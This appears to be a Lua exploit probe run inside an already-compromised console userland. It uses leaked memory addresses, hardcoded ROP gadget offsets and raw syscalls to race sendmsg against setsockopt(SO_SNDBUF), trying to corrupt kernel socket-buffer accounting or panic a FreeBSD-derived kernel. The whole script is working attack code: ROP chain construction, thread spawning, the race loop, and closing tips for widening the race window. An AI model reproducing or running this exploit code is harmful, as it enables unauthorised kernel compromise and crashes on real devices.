-- CRASH_CLASS: MODERATE
-- PROBE 93a: SO_SNDBUF resize TOCTOU race
--
-- FreeBSD 11 source: setsockopt(SO_SNDBUF) acquires SOCKBUF_LOCK but NOT
-- sblock. sosend_generic() acquires sblock but drops SOCKBUF_LOCK during
-- m_uiotombuf(). Different locks → race window.
--
-- Race: Child thread calls sendmsg with large data → sleeps in m_uiotombuf
--       holding sblock with stale space=sbspace(). Main thread calls
--       setsockopt(SO_SNDBUF, small) → shrinks sb_hiwat while child sleeps.
--       Child wakes → appends full data → sb_cc >> sb_hiwat → accounting
--       corruption: negative sbspace, mbuf chain leak, or panic.
--
-- Design: child=sendmsg (3 args, fits ROP), main=setsockopt (5 args, needs Lua)
--
-- All primitives confirmed on 14.10:
--   socketpair(135) ✓, sendmsg(28) ✓, setsockopt(105) SO_SNDBUF ✓,
--   thr_new(455) ✓, getsockopt(118) ✓

print("=== PROBE 93a: SO_SNDBUF resize TOCTOU race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV(11), SIGSYS(12), SIGPIPE(13)
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Fake TCB for child threads
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))

local function build_child_rop(stack_base, chain_fn)
    local sb = N(stack_base)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    local fsbase_ptr = memory.alloc(8)
    wq(N(fsbase_ptr), uint64(N(fake_tcb)))
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fsbase_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    chain_fn(emit)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    return rsp, sb
end

local function spawn_child(stack_base)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(N(stack_base)))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    pcall(function() mk(455)(par, uint64(0x38)) end)
    return tid
end

-- [A] Baseline: socketpair + SO_SNDBUF set/get
print("")
print("[A] BASELINE")
local sp = memory.alloc(16)
wd(N(sp), 0); wd(N(sp) + 4, 0)
local spret = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
local fd_a = rd(N(sp)) or -1
local fd_b = rd(N(sp) + 4) or -1
print(string.format("  socketpair ret=%d fd_a=%d fd_b=%d", spret, fd_a, fd_b))

local optval = memory.alloc(8)
local optlen = memory.alloc(8)
wd(N(optval), 0); wd(N(optlen), 4)
pcall(function() mk(118)(uint64(fd_a), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
local initial_sndbuf = rd(N(optval)) or 0
print(string.format("  initial SO_SNDBUF=%d", initial_sndbuf))

-- Test set
local setval = memory.alloc(4)
wd(N(setval), 256)
local setret = sgn(mk(105)(uint64(fd_a), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)))
wd(N(optval), 0); wd(N(optlen), 4)
pcall(function() mk(118)(uint64(fd_a), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
local after_set = rd(N(optval)) or 0
print(string.format("  setsockopt(256) ret=%d readback=%d", setret, after_set))

-- Test sendmsg on baseline
local send_buf = memory.alloc(256)
for i = 0, 252, 4 do wd(N(send_buf) + i, 0x41414141) end
local iov_test = memory.alloc(16)
wq(N(iov_test), uint64(N(send_buf)))
wq(N(iov_test) + 8, uint64(64))
local mhdr_test = memory.alloc(56)
for i = 0, 52, 4 do wd(N(mhdr_test) + i, 0) end
wq(N(mhdr_test) + 16, uint64(N(iov_test)))
wq(N(mhdr_test) + 24, uint64(1))
local smret = sgn(mk(28)(uint64(fd_a), uint64(N(mhdr_test)), uint64(0)))
print(string.format("  sendmsg(64B) ret=%d", smret))

-- Drain read side
local drain = memory.alloc(0x1000)
local drret = sgn(mk(3)(uint64(fd_b), drain, uint64(0x1000)))
print(string.format("  drain read ret=%d", drret))

pcall(function() mk(6)(uint64(fd_a)) end)
pcall(function() mk(6)(uint64(fd_b)) end)

if spret ~= 0 then
    print("socketpair FAILED"); print("=== 93a COMPLETE (NEGATIVE) ==="); return
end
if not alive() then print("DEAD after baseline"); return end

-- [B] RACE LOOP
print("")
print("[B] RACE — child sendmsg vs main setsockopt(SO_SNDBUF)")
print("  child sends large data, main shrinks buffer concurrently")
print("")

local ITERS = 50
local SEND_SIZE = 8192
local anomalies = 0
local send_successes = 0

local big_buf = memory.alloc(SEND_SIZE + 16)
for i = 0, SEND_SIZE - 1, 4 do wd(N(big_buf) + i, 0x42424242) end

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** PROCESS DEAD ***", iter))
        break
    end

    -- Fresh socketpair
    wd(N(sp), 0); wd(N(sp) + 4, 0)
    local r = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp) + 4) or -1
    if r ~= 0 or fW < 0 then
        if iter <= 3 then print(string.format("  iter %d: socketpair failed", iter)) end
        break
    end

    -- Set SO_SNDBUF large
    wd(N(setval), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)

    -- Build msghdr for sendmsg
    local iov = memory.alloc(16)
    wq(N(iov), uint64(N(big_buf)))
    wq(N(iov) + 8, uint64(SEND_SIZE))
    local mhdr = memory.alloc(56)
    for i = 0, 52, 4 do wd(N(mhdr) + i, 0) end
    wq(N(mhdr) + 16, uint64(N(iov)))
    wq(N(mhdr) + 24, uint64(1))

    local send_result = memory.alloc(8)
    wq(N(send_result), uint64(0xDEADDEAD))
    local marker = memory.alloc(8)
    wq(N(marker), uint64(0))

    -- Child: sendmsg(fW, &mhdr, 0) — 3 args, fits ROP
    local stk = memory.alloc(0x4000)
    build_child_rop(stk, function(emit)
        emit(g_pop_rax); emit(uint64(0xAAAA0001))
        emit(g_pop_rdi); emit(uint64(N(marker)))
        emit(g_mov_m_rax)
        -- sendmsg(fW, mhdr, 0)
        emit(g_pop_rdi); emit(uint64(fW))
        emit(g_pop_rsi); emit(uint64(N(mhdr)))
        emit(g_pop_rdx); emit(uint64(0))
        emit(g_pop_rax); emit(uint64(28))
        emit(stub)
        -- Store result
        emit(g_pop_rdi); emit(uint64(N(send_result)))
        emit(g_mov_m_rax)
    end)

    -- Spawn child (starts sendmsg)
    spawn_child(stk)

    -- Immediately start shrinking SO_SNDBUF from main thread (race window)
    for shrink = 1, 30 do
        wd(N(setval), 1)
        pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
        -- Brief gap then set large again to widen window
        wd(N(setval), 65536)
        pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), setval, uint64(4)) end)
    end

    -- Wait for child
    for w = 1, 80000 do local _ = rd(N(stk)) end

    local m = rq(N(marker))
    local sret = rq(N(send_result))
    local sret_s = sgn(sret)
    local ran = (N(m) ~= 0)

    -- Read post-race SO_SNDBUF
    wd(N(optval), 0); wd(N(optlen), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), optval, optlen) end)
    local post_sndbuf = rd(N(optval)) or 0

    -- Read how much data is in the buffer (SO_NREAD if available)
    -- Try getsockopt SO_ERROR to check for corruption
    wd(N(optval), 0); wd(N(optlen), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1007), optval, optlen) end)
    local so_error = rd(N(optval)) or 0

    if ran and sret_s > 0 then send_successes = send_successes + 1 end

    -- Anomaly: sent > current sndbuf, or SO_ERROR nonzero
    local is_anomaly = false
    if ran and sret_s > 0 and post_sndbuf > 0 and sret_s > post_sndbuf * 2 then
        is_anomaly = true; anomalies = anomalies + 1
    end
    if so_error ~= 0 then
        is_anomaly = true; anomalies = anomalies + 1
    end

    -- Close
    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)

    if is_anomaly then
        print(string.format("  iter %d: *** ANOMALY *** sent=%d sndbuf=%d err=%d ran=%s",
            iter, sret_s, post_sndbuf, so_error, ran and "Y" or "N"))
    elseif iter <= 3 or iter == ITERS or iter % 10 == 0 then
        print(string.format("  iter %d: sent=%d sndbuf=%d ran=%s",
            iter, sret_s, post_sndbuf, ran and "Y" or "N"))
    elseif iter == 4 then
        print("  ...")
    end
end

if not alive() then
    print("")
    print("*** PROCESS DIED — kernel panic from buffer accounting corruption ***")
    print("*** SO_SNDBUF TOCTOU IS EXPLOITABLE ***")
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:      %d", ITERS))
print(string.format("  send successes:  %d", send_successes))
print(string.format("  anomalies:       %d", anomalies))
print(string.format("  process:         %s", alive() and "ALIVE" or "DEAD"))

if not alive() then
    print("*** KERNEL PANIC — SO_SNDBUF TOCTOU CONFIRMED ***")
elseif anomalies > 0 then
    print("*** BUFFER ACCOUNTING ANOMALY — race window exists ***")
else
    print("Clean. sendmsg may complete before setsockopt reaches the window.")
    print("Try: larger SEND_SIZE, MSG_DONTWAIT flag, or pre-fill buffer first.")
end

print("")
print("=== 93a COMPLETE ===")
